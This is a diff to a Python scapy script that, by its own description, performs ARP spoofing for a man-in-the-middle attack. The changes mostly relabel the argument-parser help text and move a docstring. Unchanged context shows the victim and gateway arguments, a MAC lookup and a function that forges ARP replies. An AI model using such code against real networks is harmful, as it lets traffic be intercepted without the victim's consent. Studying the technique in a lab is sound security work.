@@ -4,10 +4,13 @@
 import scapy.all as scapy 
 import time
 import argparse
-# import sys
 
 def get_arguments():
-    parser =  argparse.ArgumentParser(prog='ProgramName',description='What the program does', epilog='Text at the bottom of help')
+    parser =  argparse.ArgumentParser(
+        prog='ARP Spoofing',
+        description='This program performs Man in the Middle Attack, all the dst fields get victim details and src field gets the fetch detail', 
+        epilog='Author : Gemstone Hashghost'
+        )
     parser.add_argument('-t', '--target', dest='target_ip',  help='Victim IP')
     parser.add_argument('-g', '--gateway', dest='gateway_ip', help='Router ip/Gateway IP')
 
@@ -27,10 +30,6 @@ def get_mac(ip):
 
     return answered_list[0][1].hwsrc
 
-'''
-This program performs Man in the Middle Attack, all the dst fields get victim details and src field gets the fetch detail,
-Just provide two args like ./arpspoof.py 172.16.34.129 172.16.34.2
-'''
 def spoof(victim_ip, router_ip):
     target_mac = get_mac(router_ip)
     packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac, psrc=router_ip)
